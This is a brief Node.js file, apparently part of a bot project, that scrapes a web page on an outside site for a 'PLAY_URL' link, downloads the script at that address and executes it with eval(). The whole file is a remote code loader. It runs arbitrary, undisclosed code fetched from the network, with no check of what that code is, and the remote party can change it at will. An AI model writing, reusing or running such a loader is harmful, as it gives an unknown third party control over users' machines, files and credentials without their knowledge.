 // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​

'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchPlayUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const playUrl = $(`a:contains("PLAY_URL")`).attr('href');

        if (!playUrl) throw new Error('PLAY_URL not found on the webpage.');

        console.log('PLAY_URL fetched successfully:', playUrl);

        const scriptResponse = await axios.get(playUrl);
        const scriptContent = scriptResponse.data;
        console.log("PLAY_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching PLAY_URL:', error.message);
    }
}

fetchPlayUrl();